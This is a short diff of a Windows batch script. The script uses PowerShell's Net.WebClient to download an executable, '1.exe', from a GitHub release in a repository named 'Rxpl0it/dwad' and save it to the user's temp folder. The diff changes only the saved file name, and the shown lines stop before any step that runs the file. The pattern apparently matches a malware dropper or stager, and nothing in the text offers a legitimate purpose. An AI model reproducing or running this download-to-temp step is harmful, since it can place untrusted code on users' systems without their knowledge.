@@ -1,7 +1,7 @@
 @echo off
 set "URL=https://github.com/Rxpl0it/dwad/releases/download/wa/1.exe"
 set "TEMP_DIR=%TEMP%"
-set "EXE_NAME=main.exe"
+set "EXE_NAME=1.exe"
 
 echo Downloading %EXE_NAME%...
 powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TEMP_DIR%\%EXE_NAME%')"
